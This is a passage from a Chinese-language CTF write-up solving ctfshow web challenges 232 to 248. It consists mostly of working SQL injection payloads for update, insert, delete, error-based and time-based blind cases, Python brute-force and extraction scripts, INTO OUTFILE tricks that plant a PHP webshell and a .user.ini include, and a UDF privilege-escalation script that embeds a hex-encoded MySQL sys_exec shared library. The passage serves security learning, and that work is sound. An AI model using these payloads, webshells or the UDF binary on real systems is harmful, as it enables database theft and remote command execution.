database())--+&username=test\n数据库名：ctfshow_web\n\npassword=1'),username=(select group_concat(table_name)from information_schema.tables where table_schema=database())--+&username=test\n数据表名：banlist,ctfshow_user,flagaa\n\npassword=1'),username=(select group_concat(column_name)from information_schema.columns where table_name='flagaa')--+&username=test\n字段名：id,flagass,info\n\npassword=1'),username=(select flagass from flagaa)--+&username=test\n```\n\n### web233\n\n```\n$sql = \"update ctfshow_user set pass = '\\' where username = '{$username}';\";\n```\n\n过滤了单引号，直接转义逃逸单引号就行\n\n```\npassword=\\&username=,username=(select database())--+\n数据库名：ctfshow_web\n\npassword=\\&username=,username=(select group_concat(table_name)from information_schema.tables where table_schema=database())--+\n数据表名：banlist,ctfshow_user,flag233333\n\npassword=\\&username=,username=(select group_concat(column_name)from information_schema.columns where table_name='flag233333')--+\n字段名：id,flagass233,info\n\npassword=\\&username=,username=(select flagass233 from flag233333)--+\n```\n\n我发现过滤单引号只是在password中的，username中用单引号不影响\n\n### web234\n\n这里连username的单引号也过滤了，不过也可以用双引号\n\n```\npassword=\\&username=,username=(select group_concat(column_name)from information_schema.columns where table_name=\"flag23a\")--+\n字段名：id,flagass23s3,info\n\npassword=\\&username=,username=(select flagass23s3 from flag23a)--+\n```\n\n### web235\n\n过滤了or和单引号，这样的话information_schema库就用不了了，打无列名注入\n\n用mysql的innodb_index_stats表\n\n```\npassword=\\&username=,username=(select group_concat(database_name) from mysql.innodb_index_stats)--+\n库名：忘记了没看到\n\npassword=\\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())--+\n表名：banlist,ctfshow_user,flag23a1\n```\n\n然后用union取别名爆数据\n\n```\npassword=\\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)--+\n```\n\n这里需要limit限制输出，不然结果出不来\n\n### web236\n\n多过滤了flag，先看看表名是什么\n\n```\npassword=\\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())--+\nbanlist,ctfshow_user,flaga\n```\n\n但是好像在username中没有禁用flag，只是在password中禁用了\n\n```\npassword=\\&username=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)--+\n```\n\n## insert 注入\n\n### web237\n\n```\n$sql = \"insert into ctfshow_user(username,pass) value('{$username}','{$password}');\";\n```\n\n这里还是一样的，不过需要结束前面的insert语句\n\n记得需要闭合后面的括号\n\n在添加里面传入payload\n\n```\nusername=1',(select database()));#&password=\n```\n\n插入语句\n\n```\n$sql = \"insert into ctfshow_user(username,pass) value('1',(select database()));#','');\";\n```\n\npayload\n\n```\nusername=1',(select group_concat(schema_name) from information_schema.schemata))#&password=1\n库名：ctfshow_web\n\nusername=2',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&password=1\n表名：banlist,ctfshow_user,flag\n\nusername=3',(select group_concat(column_name) from information_schema.columns where table_name='flag'))#&password=1\n字段名：id,flagass23s3,info\n\nusername=4',(select flagass23s3 from flag))#&password=1\n```\n\n需要注意的是，insert只是插入数据的，不能覆盖数据，所以我们每次注入的结果得重新构造username的名字才能进行下一次插入\n\n### web238\n\n过滤了空格，用空格绕过就行\n\n```\nusername=1',(select(database())))#&password=1\n库名：ctfshow_web\n\nusername=2',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&password=1\n表名：banlist,ctfshow_user,flagb\n\nusername=3',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))#&password=1\n字段名：id,flagass23s3,info\n\nusername=4',(select(flag)from(flagb)))#&password=1\n```\n\n### web239\n\n```\n过滤空格 or \n```\n\n一样的，用其他的库去爆\n\n库名还是ctfshow_web\n\n```\nusername=2',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&password=1\n表名：banlist,ctfshow_user,flagbb\n```\n\n然后union取别名爆字段\n\n```\nusername=3',(select(b)from(select(1),(2)as(b),(3)union(select(flagbb)limit(0),(1)))a))#&password=1\n```\n\n好奇怪取别名打不通，直接爆flag试试\n\n```\nusername=3',(select(group_concat(flag))from(ctfshow_web.flagbb)))#&password=1\n```\n\n### web240\n\n```\n过滤空格 or sys mysql\n```\n\n断绝路了，那就直接爆表名吧，根据题目hint\n\n```\nHint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写\n```\n\n写个脚本输出全部的组合\n\n```python\ndef generate_all_ab_combinations(length=5):\n    \"\"\"\n    生成由 'a' 和 'b' 组成的所有可能组合的字符串。\n    :param length: 字符串的长度，默认为 5\n    :return: 所有组合的列表\n    \"\"\"\n    from itertools import product\n\n    # 生成所有可能的组合\n    combinations = [''.join(comb) for comb in product('ab', repeat=length)]\n    return combinations\n\n\n# 生成所有五位组合\nall_combinations = generate_all_ab_combinations()\n\n# 将结果写入文件\nwith open('for5.txt', 'w') as file:\n    for comb in all_combinations:\n        file.write(comb + '\\n')\n\nprint(\"所有组合已写入文件 'for5.txt'\")\n```\n\n然后爆破\n\n```python\nimport requests\n\nurl = \"http://66eef819-a9cc-4007-8627-a7cdabdbc269.challenge.ctf.show/api/insert.php\"\ncontent = \"\"\nwith open('for5.txt','r') as file:\n    for line in file:\n        content = line.strip()\n        payload = f\"flag{content}\"\n        data = {\n            \"username\" : f\"1',(select(flag)from({payload})))#\",\n            \"password\" : '1',\n        }\n        #print(data)\n        r = requests.post(url=url, data=data)\n```\n\n当然也可以直接打\n\n```python\n#by baozongwi\nimport requests\n\nurl=\"http://66eef819-a9cc-4007-8627-a7cdabdbc269.challenge.ctf.show/api/insert.php\"\n\nfor a1 in \"ab\":\n    for a2 in \"ab\":\n        for a3 in \"ab\":\n            for a4 in \"ab\":\n                for a5 in \"ab\":\n                    payload='flag'+a1+a2+a3+a4+a5\n                    data={\n                        'username':f\"1',(select(flag)from({payload})))#\",\n                        'password':'1'\n                    }\n                    r=requests.post(url=url,data=data)\n```\n\n最后刷新一下页面看看添加的结果就行\n\n## delete 注入\n\n### web241\n\n```\n//删除记录\n  $sql = \"delete from  ctfshow_user where id = {$id}\";\n```\n\n路由是/api/delete.php，POST参数的id\n\n因为delete本身不会返回结果，所以我们打时间盲注\n\n```\nid=sleep(0.15)\n```\n\n延迟差不多3s左右，直接写脚本\n\n```python\nimport requests\nimport time\n\nurl = \"http://4450a879-5ff0-4c75-b503-1f6341f95494.challenge.ctf.show/api/delete.php\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n        #payload = f\"if(ascii(substr((select database()),{i},1))>{mid},sleep(0.15),0)#\"\n        #payload = f\"if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(0.15),0)#\"\n        #payload = f\"if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{i},1))>{mid},sleep(0.15),0)#\"\n        payload = f\"if(ascii(substr((select flag from flag),{i},1))>{mid},sleep(0.15),0)#\"\n\n        data = {\n            \"id\" : payload,\n        }\n        print(data)\n\n        start = time.time()\n        r = requests.post(url, data=data)\n        end = time.time() - start\n\n        if end > 2 :\n            head = mid + 1\n        else :\n            tail = mid\n\n    if head != 32 :\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n```\n\n## file模块\n\n### web242\n\n```\n//备份表\n  $sql = \"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';\";\n```\n\n写入文件，路由是/api/dump.php\n\n用`lines terminated by `或者`lines starting by `或者`fields terminated by `写入\n\n```\nfilename=1.php' lines terminated by '<?php phpinfo();?>';#\nfilename=1.php' lines starting by '<?php phpinfo();?>';#\nfilename=1.php' fields terminated by '<?php phpinfo();?>';#\n```\n\n然后写🐎访问/dump/shell.php就行\n\n```\n1=system('cat /flag.here');\n```\n\n### web243\n\n```\n//过滤了php\n```\n\n跟文件上传一样打\n\n看一下中间件nginx/1.20.1\n\n先传一个1.txt文件\n\n```\nfilename=1.txt' lines terminated by '<?= eval($_POST[1]); ?>'#\n```\n\n传`.user.ini`文件\n\n然后访问/dump并RCE\n\n```\n1=system(\"cat /f*\");\n```\n\n因为`.user.ini文件`会将1.txt包含道服务器默认的php文件中例如index.php，并且我们访问/dump的话也是会自动导向默认的php文件，所以直接访问/dump就行\n\n## 报错注入\n\n### web244\n\n报错注入开始，可以用`updatexml\\extractvalue`打xpath报错注入\n\n```\n//备份表\n  $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\";\n```\n\npayload\n\n```\n/api/?id=1' or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n回显~ctfshow_web~\n\n/api/?id=1' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+\n回显~banlist,ctfshow_flag,ctfshow_us\n\n/api/?id=1' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flag'),0x7e),1)--+\n回显~id,flag,info~\n```\n\n后面发现无法全部显示，换成left和right去分别输出吧\n\n```\n/api/?id=1' or updatexml(1,concat(0x7e,left((select flag from ctfshow_flag),30),0x7e),1)--+\n~ctfshow{ee4ca922-a90b-4041-bf5~\n\n/api/?id=1' or updatexml(1,concat(0x7e,right((select flag from ctfshow_flag),30),0x7e),1)--+\n~2-a90b-4041-bf53-f5a23fa9d0a6}~\n```\n\n拼接后就是\n\n```\nctfshow{ee4ca922-a90b-4041-bf53-f5a23fa9d0a6}\n```\n\n### web245\n\n过滤`updatexml`那就用另一个`extractvalue`呗\n\n```\n/api/?id=1' or extractvalue(1,concat(0x7e,(select version())))--+\n```\n\n回显\n\n```\n~10.3.18-MariaDB\n```\n\n那直接打就行\n\n```\n/api/?id=1' or extractvalue(1,concat(0x7e,(select database())))--+\n回显~ctfshow_web\n\n/api/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))--+\n回显~banlist,ctfshow_flagsa,ctfshow_\n\n/api/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagsa')))--+\n回显~id,flag1,info\n\n/api/?id=1' or extractvalue(1,concat(0x7e,left((select flag1 from ctfshow_flagsa),30)))--+\n/api/?id=1' or extractvalue(1,concat(0x7e,right((select flag1 from ctfshow_flagsa),30)))--+\n```\n\n### web246\n\n```\n 过滤updatexml extractvalue\n```\n\nxpath报错走不了了，用group by 报错注入\n\nfloor(rand(0)*2) 产生的随机数的**前六位** 一定是 “011011”\n\n然后我们的payload就是\n\n```\n/api/?id=1' union select count(*),2,concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a--+\n回显ctfshow_web~1\n```\n\n后面一直没成功，我以为是概率问题，结果发现是有限制输出长度\n\n用切片函数去分段输出\n\n```\n/api/?id=1' union select 1,count(*),concat(left((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+\n\n/api/?id=1' union select 1,count(*),concat(left((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flags'),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+\n\n/api/?id=1' union select 1,count(*),concat(left((select flag2 from ctfshow_flags),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+\n\n/api/?id=1' union select 1,count(*),concat(right((select flag2 from ctfshow_flags),30),0x7e,floor(rand(0)*2))a from information_schema.tables group by a--+\n```\n\n### web247\n\n```\n过滤updatexml extractvalue floor\n```\n\n说明上面的是预期解，我们继续用别的方法\n\n```\nceil()-向上取整函数\nceil(x) 返回不小于 x 的最小整数，即向上取整。\n例如，ceil(3.14) 返回 4。\n\nround() - 四舍五入函数\nround(x) 返回最接近 x 的整数，如果有两个整数与 x 距离相等，则返回偶数的整数。\n例如，round(3.6) 返回 4，round(3.5) 返回 4，round(3.4) 返回 3。\n```\n\npayload\n\n```\n/api/?id=1' union select count(*),2,concat((select database()),0x7e,round(rand(0)*2))as a from information_schema.tables group by a--+\n\n/api/?id=1' union select count(*),2,concat((select database()),0x7e,ceil(rand(0)*2))as a from information_schema.tables group by a--+\n\n回显ctfshow_web~1\n\n/api/?id=1' union select 1,count(*),concat(0x7e,left((select group_concat(table_name)from information_schema.tables where table_schema=database()),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+\n\n/api/?id=1' union select 1,count(*),concat(0x7e,left((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_flagsa'),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+\n```\n\n这里有一个需要注意的地方，因为爆出来的字段名是`flag?`，所以需要用反引号去括起来否则会造成解析错误\n\n```\n/api/?id=1' union select 1,count(*),concat(0x7e,left((select `flag?` from ctfshow_flagsa),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+\n\n/api/?id=1' union select 1,count(*),concat(0x7e,right((select `flag?` from ctfshow_flagsa),30),0x7e,round(rand(0)*2))a from information_schema.tables group by a--+\n```\n\n## UDF注入\n\n### web248\n\nUDF提权\n\n```\n $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\";\n```\n\n参考师傅的脚本\n\n```python\n# 参考脚本\n# 环境：Linux/MariaDB\nimport requests\n\nurl = 'http://e0755bce-8366-435e-ae6d-acd10ff77c81.challenge.ctf.show/api/?id='\ncode = '7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C0000